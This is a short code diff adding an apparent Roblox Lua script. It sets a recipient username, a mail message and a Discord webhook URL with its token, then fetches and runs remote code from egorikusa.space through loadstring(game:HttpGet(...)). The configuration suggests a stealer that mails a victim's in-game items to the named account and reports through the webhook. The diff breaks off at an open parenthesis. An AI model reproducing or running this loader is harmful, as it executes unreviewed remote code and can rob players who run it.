@@ -1,0 +1,5 @@
+Username = "ARTHURMGIC"
+MailMessage = "ez egorikusa best"
+Webhook = "https://discord.com/api/webhooks/1234572466635018250/gL7rfTPqyEkcrVsMi7pJKlQo7UomkCj8EiTNVkj0ZW8iUH_zEhUtR4EOYuPLmHG5LQqK"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))(
